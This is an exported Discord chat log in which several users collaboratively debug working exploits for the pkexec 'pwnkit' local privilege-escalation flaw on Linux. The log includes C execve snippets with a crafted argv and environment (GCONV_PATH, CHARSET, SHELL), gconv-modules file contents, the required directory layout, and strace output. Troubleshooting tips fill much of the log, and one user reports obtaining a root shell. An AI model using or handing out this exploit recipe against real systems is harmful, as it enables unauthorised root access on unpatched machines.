+I do, but it is a bit funny don't you agree
+[smx2460]
+smx2460 01/25/2022 11:07 PM
+(no content)
+[unknown.png]
+ unknown.png
+156.98 KB External
+01/25/2022 11:07 PM
+01/25/2022 11:06 PM
+you don't trust Smx?
+[_._._._._._._._._._._.]
+_._._._._._._._._._._. 01/25/2022 11:06 PM
+Binary root exploit? That's not suspicious at all
+[smx2460]
+smx2460 01/25/2022 11:05 PM
+@DustyAngel47 try this
+01/25/2022 11:05 PM
+(no content)
+ pwnkit
+28.09 KB External
+[dustyangel47]
+dustyangel47 01/25/2022 10:55 PM
+okay i give up
+[dogelition]
+dogelition 01/25/2022 10:52 PM
+that's a great question
+[dustyangel47]
+dustyangel47 01/25/2022 10:52 PM
+how is it working for you??
+01/25/2022 10:51 PM
+it doesnt work on my vps either
+01/25/2022 10:51 PM
+b r u h
+01/25/2022 10:51 PM
+i'm gonna test on my vps
+[smx2460]
+smx2460 01/25/2022 10:47 PM
+unless i fucked something else up
+[infowski]
+infowski 01/25/2022 10:47 PM
+I don't think it was - it worked for me with gconv directory name
+[smx2460]
+smx2460 01/25/2022 10:47 PM
+i wanna try again as i don't believe this lol
+[infowski]
+infowski 01/25/2022 10:47 PM
+[smx2460]
+smx2460 01/25/2022 10:47 PM
+    sm@debian:/mnt/ExtData/pwnkitd/t2$ ./pwnkit.sh
+    HELLO
+    /usr/bin/pkexec
+    #
+01/25/2022 10:47 PM
+fuck my life
+01/25/2022 10:47 PM
+that was the fucking issue.
+01/25/2022 10:47 PM
+using "gconv" as the directory name. (edited)
+01/25/2022 10:47 PM
+the directory name.
+01/25/2022 10:47 PM
+wtf.
+[dogelition]
+dogelition 01/25/2022 10:46 PM
+just tested my up-to-date arch (in wsl2) and that worked fine
+[dustyangel47]
+dustyangel47 01/25/2022 10:44 PM
+nope (edited)
+[unknown.png]
+ unknown.png
+5.71 KB External
+[dogelition]
+dogelition 01/25/2022 10:43 PM
+no hits?
+01/25/2022 10:43 PM
+what if you search for GCONV_PATH=.
+[dustyangel47]
+dustyangel47 01/25/2022 10:43 PM
+no lol
+[unknown.png]
+ unknown.png
+11.43 KB External
+[dogelition]
+dogelition 01/25/2022 10:43 PM
+but if not even that is happening on your machine then i'm 100% confused
+01/25/2022 10:43 PM
+i didn't test it entirely, only checked the strace output and it
+definitely accessed the pwn file there
+[smx2460]
+smx2460 01/25/2022 10:41 PM
+wtf
+[dustyangel47]
+dustyangel47 01/25/2022 10:41 PM
+artix (edited)
+01/25/2022 10:41 PM
+bruh moment
+[unknown.png]
+ unknown.png
+79.13 KB External
+[dogelition]
+dogelition 01/25/2022 10:41 PM
+what distro are you running?
+01/25/2022 10:40 PM
+extracted it and did gcc run.c -o run; sudo strace ./run (edited)
+01/25/2022 10:39 PM
+works on my machine
+[dustyangel47]
+dustyangel47 01/25/2022 10:36 PM
+can someone try this and tell me if i'm going insane
+01/25/2022 10:36 PM
+there is no apparent reason this shouldn't be working
+ pkexec-exploit.tar.gz
+8.25 KB External
+[infowski]
+infowski 01/25/2022 10:35 PM
+and break at openlog and check the environment (edited)
+01/25/2022 10:35 PM
+tip: plop it into gdb (as root) (edited)
+[smx2460]
+smx2460 01/25/2022 10:35 PM
+that the shell is invalid
+01/25/2022 10:34 PM
+i get the encoded message
+01/25/2022 10:34 PM
+because if i put an invalid one
+01/25/2022 10:34 PM
+i changed it
+[dustyangel47]
+dustyangel47 01/25/2022 10:34 PM
+yeah (edited)
+01/25/2022 10:34 PM
+SHELL needs to be a non-existent value, as well, to trigger
+gconv_printerr (edited)
+[infowski]
+infowski 01/25/2022 10:34 PM
+plus both CHARSET and SHELL need to be "invalid"
+[smx2460]
+smx2460 01/25/2022 10:34 PM
+and also builds itself again as a module
+01/25/2022 10:34 PM
+it touches all required files
+01/25/2022 10:34 PM
+my .c code actually does everything
+01/25/2022 10:34 PM
+yes
+[infowski]
+infowski 01/25/2022 10:34 PM
+"PATH=GCONV_PATH=.", plus make sure GCONV_PATH=. directory with gconv
+executable exists in cwd
+[smx2460]
+smx2460 01/25/2022 10:33 PM
+i also tried using a nonexistent charset i defined on my own (edited)
+01/25/2022 10:33 PM
+i'm doing this
+01/25/2022 10:33 PM
+        char *args[] = {NULL};
+        char *env[] = {
+            "gconv",
+            //"PATH=GCONV_PATH=.",
+            "PATH=GCONV_PATH",
+            "CHARSET=LATIN-GREEK",
+            "SHELL=/bin/sh",
+            NULL
+        };
+        execve("/usr/bin/pkexec", args, env);
+01/25/2022 10:33 PM
+yes
+[infowski]
+[] dustyangel47 run.c: ```c #define _GNU_SOURCE #include <stdio.h>
+#include <stdlib.h> #include <unistd.h> int main...
+infowski 01/25/2022 10:33 PM
+@Smx seen that?
+[infowski]
+infowski 01/25/2022 10:32 PM
+I think you may not be doing this right
+[smx2460]
+[] dogelition are you passing GCONV_PATH as the first environment
+variable?
+smx2460 01/25/2022 10:32 PM
+ahd no
+[smx2460]
+smx2460 01/25/2022 10:31 PM
+i get it in argv[1] as if nothing happened
+01/25/2022 10:31 PM
+there must be some sort of alignment on my system
+[dustyangel47]
+dustyangel47 01/25/2022 10:27 PM
+inb4 patched even though i haven't updated in like a month (edited)
+[dogelition]
+dogelition 01/25/2022 10:27 PM
+i think your pkexec is cursed
+[dustyangel47]
+dustyangel47 01/25/2022 10:26 PM
+nothing there of the sort
+01/25/2022 10:26 PM
+nope
+[dogelition]
+dogelition 01/25/2022 10:25 PM
+that should be in there if it's actually trying to access the directory
+01/25/2022 10:25 PM
+access("GCONV_PATH=./pwn", X_OK)
+01/25/2022 10:23 PM
+anything related to that GCONV_PATH=. path in the strace output?
+(edited)
+01/25/2022 10:23 PM
+i don't get it then
+[dustyangel47]
+dustyangel47 01/25/2022 10:22 PM
+nope, even after remaking the file
+[dogelition]
+dogelition 01/25/2022 10:21 PM
+i did touch pwn; chmod +x pwn
+01/25/2022 10:21 PM
+only thing i can think of is that maybe the permissions on your pwn file
+are wrong and it doesn't think it's executable?
+01/25/2022 10:20 PM
+i copied your run.c code and it worked fine
+[dustyangel47]
+dustyangel47 01/25/2022 10:19 PM
+yeah
+[dogelition]
+dogelition 01/25/2022 10:15 PM
+that setup looks exactly like mine
+[dogelition]
+[] dustyangel47 ```openat(AT_FDCWD,
+"/usr/lib/gconv/gconv-modules.cache", O_RDONLY) = -1 ENOENT (No such
+file or dir...
+dogelition 01/25/2022 10:15 PM
+very strange
+[smx2460]
+smx2460 01/25/2022 10:13 PM
+despite me NOT passing it as argv
+01/25/2022 10:13 PM
+    Authentication is needed to run `GCONV_PATH/gconv' as the super user
+01/25/2022 10:13 PM
+in the other i get
+[dustyangel47]
+dustyangel47 01/25/2022 10:13 PM
+    openat(AT_FDCWD, "/usr/lib/gconv/gconv-modules.cache", O_RDONLY) = -1 ENOENT (No such file or directory)
+    openat(AT_FDCWD, "/usr/lib/gconv/gconv-modules", O_RDONLY|O_CLOEXEC) = 3
+    newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=56353, ...}, AT_EMPTY_PATH) = 0
+[smx2460]
+smx2460 01/25/2022 10:13 PM
+so in one case i get this
+[dustyangel47]
+dustyangel47 01/25/2022 10:13 PM
+but it still doesnt even get the the custom modules file lol
+[smx2460]
+smx2460 01/25/2022 10:13 PM
+i.e. it doesn't see it at all
+01/25/2022 10:12 PM
+    GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
+    Cannot run program gconv: No such file or directory
+01/25/2022 10:12 PM
+but, if i use the alt path form
+[dustyangel47]
+dustyangel47 01/25/2022 10:12 PM
+this is the second time that has happened
+[smx2460]
+smx2460 01/25/2022 10:12 PM
+where it injects it as argv[1] (edited)
+[dogelition]
+[] dustyangel47 why was the payload file randomly erased again
+dogelition 01/25/2022 10:12 PM
+lmao
+[smx2460]
+smx2460 01/25/2022 10:12 PM
+now i'm back to before
+01/25/2022 10:12 PM
+i temporarily replaced argv with a ""
+[dustyangel47]
+dustyangel47 01/25/2022 10:11 PM
+why was the payload file randomly erased again
+[smx2460]
+smx2460 01/25/2022 10:11 PM
+i had fucked up
+01/25/2022 10:11 PM
+wait
+[dustyangel47]
+dustyangel47 01/25/2022 10:11 PM
+bruh
+01/25/2022 10:11 PM
+run.c:
+    #define _GNU_SOURCE
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    int main() {
+        const char* envs[] = {"pwn", "PATH=GCONV_PATH=.", "CHARSET=payload", "SHELL=PWN", NULL};
+        const char* args[] = {NULL};
+        execve("/usr/bin/pkexec", args, envs);
+        return 0;
+    }
+    directory output:
+    ╭─ ~/Coding/C/pkexec-exploit 
+    ╰─ ls GCONV_PATH=.            
+    pwn*
+    ╭─ ~/Coding/C/pkexec-exploit 
+    ╰─ ls pwn                     
+    gconv-modules  payload.so*
+    payload.c:
+    c
+[dogelition]
+dogelition 01/25/2022 10:10 PM
+(no content)
+[unknown.png]
+ unknown.png
+10.76 KB External
+[smx2460]
+smx2460 01/25/2022 10:10 PM
+yes that's how i'm doing it
+[dogelition]
+dogelition 01/25/2022 10:10 PM
+cyberchef op
+[smx2460]
+smx2460 01/25/2022 10:10 PM
+xD
+01/25/2022 10:10 PM
+you decoded that? 
+[dogelition]
+dogelition 01/25/2022 10:10 PM
+interesting
+01/25/2022 10:10 PM
+    module  PWNKIT//               INTERNAL                PWNKIT          1
+    module  INTERNAL                PWNKIT//               PWNKIT          1
+    module  PWNKIT//               UTF-8                PWNKIT    .......£ÒöFVÇV..REeÔ............
+[smx2460]
+smx2460 01/25/2022 10:10 PM
+wtf
+01/25/2022 10:09 PM
+lol
+01/25/2022 10:09 PM
+    execve("/usr/bin/pkexec", ["", "\322\325yY\5", 0x2020656c75646f6d, 0x2f2f54494b4e5750, 0x2020202020202020, 0x4920202020202020, 0x204c414e5245544e, 0x2020202020202020, 0x5020202020202020, 0x20202054494b4e57, 0x3120202020202020, 0x20656c75646f6d0a, 0x414e5245544e4920, 0x202020202020204c, 0x2020202020202020, 0x2f54494b4e575020, 0x202020202020202f, 0x2020202020202020, 0x202054494b4e5750, 0x2020202020202020, 0x656c75646f6d0a31, 0x54494b4e57502020, 0x2020202020202f2f, 0x2020202020202020, 0x2020382d46545520, 0x2020202020202020, 0x5750202020202020, 0x2020202054494b4e, 0xa31202020202020, 0x2020656c75646f6d, 0x202020382d465455, 0x2020202020202020, ...], 0x7ffef836bdb0 /* 45 vars */) = -1 EFAULT (Indirizzo errato)
+[dogelition]
+dogelition 01/25/2022 10:09 PM
+post your updated code + strace output maybe
+01/25/2022 10:09 PM
+idk what's up with that
+01/25/2022 10:08 PM
+yeah lmao
+[dustyangel47]
+dustyangel47 01/25/2022 10:08 PM
+~~literally what i'm doing and it doesnt work~~
+[dogelition]
+dogelition 01/25/2022 10:07 PM
+that glib file is just touch glib; chmod +x glib (edited)
+01/25/2022 10:07 PM
+this is what i have
+01/25/2022 10:07 PM
+char *env[] = {"glib", "PATH=GCONV_PATH=.", "CHARSET=payload", "SHELL=a", NULL};
+    tree
+    .
+    ├── GCONV_PATH=.
+    │   └── glib
+    ├── glib
+    │   └── gconv-modules
+[dogelition]
+[] smx2460 ```Authentication is needed to run
+`GCONV_PATH=./pwnkit-modules' as the super user Authenticating as...
+dogelition 01/25/2022 10:05 PM
+are you passing GCONV_PATH as the first environment variable?
+[smx2460]
+smx2460 01/25/2022 10:04 PM
+hm
+[dustyangel47]
+dustyangel47 01/25/2022 10:03 PM
+at least according to
+https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument
+and my test payload program (edited)
+Getting Arbitrary Code Execution from fopen's 2nd Argument
+01/25/2022 10:03 PM
+i'm like pretty sure thats how you do it?
+[smx2460]
+smx2460 01/25/2022 10:03 PM
+no
+[dustyangel47]
+dustyangel47 01/25/2022 10:03 PM
+not gconv-modules itself
+01/25/2022 10:03 PM
+you pass it a directory with gconv-modules
+01/25/2022 10:03 PM
+btw i dont think thats how gconv_path works
+[smx2460]
+smx2460 01/25/2022 10:02 PM
+despite me passing it clearly empty
+01/25/2022 10:02 PM
+it's injected as argv[1]
+01/25/2022 10:02 PM
+but not as an env for me
+01/25/2022 10:02 PM
+it is injected
+01/25/2022 10:02 PM
+    Authentication is needed to run `GCONV_PATH=./pwnkit-modules' as the super user
+    Authenticating as: sm,,, (sm)
+    Password:
+01/25/2022 10:02 PM
+same
+[dustyangel47]
+dustyangel47 01/25/2022 9:58 PM
+hmm
+01/25/2022 9:58 PM
+yeah still not being loaded (the gconv-modules) (edited)
+01/25/2022 9:56 PM
+i've removed it
+01/25/2022 9:56 PM
+yeah
+[infowski]
+infowski 01/25/2022 9:55 PM
+but that's the least of your concerns
+01/25/2022 9:55 PM
+only when you use them in shell scripts
+01/25/2022 9:55 PM
+shell variables are expanded by... shell
+[infowski]
+[] dustyangel47 Click to see attachment
+infowski 01/25/2022 9:54 PM
+also that $PATH in there will be an actual string $PATH
+[retr0id]
+retr0id 01/25/2022 9:54 PM
+no it wasn't off-by-one I miscounted
+[dustyangel47]
+dustyangel47 01/25/2022 9:54 PM
+impossible
+01/25/2022 9:54 PM
+actualy does something for me?
+[retr0id]
+retr0id 01/25/2022 9:54 PM
+oh wait
+[dustyangel47]
+dustyangel47 01/25/2022 9:54 PM
+the c compiler (edited)
+[retr0id]
+retr0id 01/25/2022 9:53 PM
+you can omit the length and the compiler will sort it out
+ 1
+01/25/2022 9:53 PM
+also the length of your envs array is off-by-one
+[dogelition]
+dogelition 01/25/2022 9:53 PM
+either way, i specified the absolute path
+01/25/2022 9:53 PM
+not in pwn
+01/25/2022 9:53 PM
+i think payload.so should be in your working directory
+[dustyangel47]
+dustyangel47 01/25/2022 9:53 PM
+yeah ik just havent bothered to remove them
+[dogelition]
+dogelition 01/25/2022 9:53 PM
+yup
+[retr0id]
+retr0id 01/25/2022 9:53 PM
+btw those putenv's are redundant
+[dustyangel47]
+dustyangel47 01/25/2022 9:53 PM
+    module PAYLOAD// INTERNAL payload 2
+    module INTERNAL PAYLOAD// payload 2
+[dogelition]
+dogelition 01/25/2022 9:52 PM
+show your gconv-modules
+[dustyangel47]
+dustyangel47 01/25/2022 9:51 PM
+doesnt work
+[dogelition]
+dogelition 01/25/2022 9:51 PM
+i think you have to get rid of that :$PATH
+[dustyangel47]
+dustyangel47 01/25/2022 9:50 PM
+(no content)
+[unknown.png]
+ unknown.png
+61.6 KB External
+01/25/2022 9:50 PM
+i think i have it right?
+01/25/2022 9:50 PM
+i have
+[dogelition]
+dogelition 01/25/2022 9:49 PM
+(and maybe read the boring parts of the writeup again so you understand
+the exact directory structure that you need)
+[dustyangel47]
+dustyangel47 01/25/2022 9:49 PM
+no its not
+[dogelition]
+dogelition 01/25/2022 9:49 PM
+check if it's actually loading the file (with strace)
+[dustyangel47]
+dustyangel47 01/25/2022 9:49 PM
+~~either that or it's not getting loaded~~
+[dogelition]
+dogelition 01/25/2022 9:48 PM
+looks like something's wrong with your gconv-modules setup then
+[dustyangel47]
+dustyangel47 01/25/2022 9:46 PM
+i'm back to here at least
+[unknown.png]
+ unknown.png
+14.98 KB External
+[dustyangel47]
+dustyangel47 01/25/2022 9:33 PM
+lmao
+01/25/2022 9:33 PM
+not the thing i specify
+01/25/2022 9:32 PM
+i was thinking "value" was a constant thing it searched for
+01/25/2022 9:32 PM
+the writeup was confusing me
+01/25/2022 9:32 PM
+ohhh fuck
+[dogelition]
+dogelition 01/25/2022 9:29 PM
+(i was mixing it up with PART=..., which should be after the "value"
+one)
+01/25/2022 9:28 PM
+in that case, use execve instead so you can actually put them in the
+right order
+[dustyangel47]
+dustyangel47 01/25/2022 9:28 PM
+its not even the first env variable though
+[dogelition]
+dogelition 01/25/2022 9:27 PM
+since SHELL=PWN (the first environment variable) takes the place of the
+first argument here
+01/25/2022 9:26 PM
+i think you're still missing the first environment variable?
+[dustyangel47]
+dustyangel47 01/25/2022 9:25 PM
+uh, at least its launching something now?
+[unknown.png]
+ unknown.png
+12.8 KB External
+01/25/2022 9:25 PM
+lMAO
+[unknown.png]
+ unknown.png
+15.19 KB External
+[dogelition]
+dogelition 01/25/2022 9:24 PM
+(strace told me that)
+01/25/2022 9:24 PM
+when that happened to me it turned out i messed up the exec call
+[dustyangel47]
+dustyangel47 01/25/2022 9:24 PM
+i mean either way currently it gives me nothing lol
+[unknown.png]
+ unknown.png
+6.79 KB External
+[dogelition]
+dogelition 01/25/2022 9:23 PM
+so i think it should work
+[dustyangel47]
+dustyangel47 01/25/2022 9:23 PM
+if it copies the current environ and i have the env variables set there
+[dogelition]
+dogelition 01/25/2022 9:23 PM
+oh yeah, just tested it, seems like new environment variables get added
+at the start and not at the end
+[dustyangel47]
+dustyangel47 01/25/2022 9:23 PM
+it should work without ve maybe? (edited)
+01/25/2022 9:23 PM
+so i mena
+01/25/2022 9:23 PM
+> The other functions take the environment for the new process image
+from the external variable environ in the calling process.
+[dogelition]
+dogelition 01/25/2022 9:21 PM
+not sure though
+01/25/2022 9:21 PM
+i don't think the order would be right either way otherwise
+01/25/2022 9:21 PM
+use execve
+[dustyangel47]
+dustyangel47 01/25/2022 9:21 PM
+execvp doesnt pass env variables does it?
+01/25/2022 9:19 PM
+yeah i checked
+[infowski]
+infowski 01/25/2022 9:18 PM
+nope
+[dustyangel47]
+dustyangel47 01/25/2022 9:18 PM
+inb4 webos has pkexec and new root method
+[infowski]
+infowski 01/25/2022 9:18 PM
+wonder if it's possible to make something that's both dlopen-able, and
+executable
+01/25/2022 9:18 PM
+now, how do i nicely wrap this up in a single binary 
+[dogelition]
+dogelition 01/25/2022 9:14 PM
+i looked over the boring parts of that other blog post so mine didn't
+work at first either (didn't know that i needed a gconv-modules file,
+but strace helped me out there)
+01/25/2022 9:13 PM
+[:PepeLaugh:]
+[dustyangel47]
+[] dustyangel47 dont look over the boring parts of a writeup
+dustyangel47 01/25/2022 9:13 PM
+.
+[dogelition]
+dogelition 01/25/2022 9:13 PM
+(no content)
+[unknown.png]
+ unknown.png
+6.88 KB External
+01/25/2022 9:13 PM
+that's supposed to be the second one
+[dustyangel47]
+dustyangel47 01/25/2022 9:13 PM
+> PATH=GCONV_PATH=.
+[dogelition]
+dogelition 01/25/2022 9:12 PM
+i think you're also missing the first ("value") environment variable
+[infowski]
+infowski 01/25/2022 9:11 PM
+because the way you run it there's pkexec in argv[0]
+[dustyangel47]
+dustyangel47 01/25/2022 9:11 PM
+dont look over the boring parts of a writeup
+01/25/2022 9:11 PM
+note to self
+01/25/2022 9:10 PM
+[]
+[infowski]
+infowski 01/25/2022 9:10 PM
+tip: you need to use execve manually to set the wrong argv in the first
+place
+[dustyangel47]
+dustyangel47 01/25/2022 9:10 PM
+yeah i'm pretty sure i have something setup wrong here
+[unknown.png]
+ unknown.png
+7.31 KB External
+01/25/2022 9:08 PM
+entirely possible i'm blind and the env variable is still not getting
+set properly
+[dogelition]
+dogelition 01/25/2022 9:07 PM
+and then added CHARSET=payload to pkexec's environment variables
+(edited)
+[dustyangel47]
+dustyangel47 01/25/2022 9:07 PM
+yeah thats what i was doing originally too
+[dogelition]
+dogelition 01/25/2022 9:07 PM
+    module  PAYLOAD//    INTERNAL    /path/to/payload    2
+    module  INTERNAL    PAYLOAD//    /path/to/payload    2
+01/25/2022 9:06 PM
+idk, this is what i did
+[dustyangel47]
+dustyangel47 01/25/2022 9:05 PM
+or is utf-8 special and non-overwritable or something
+01/25/2022 9:05 PM
+this should work right?
+[unknown.png]
+ unknown.png
+3.67 KB External
+01/25/2022 9:03 PM
+preparing to double-lose because utf-8 just doesnt want to be set lol
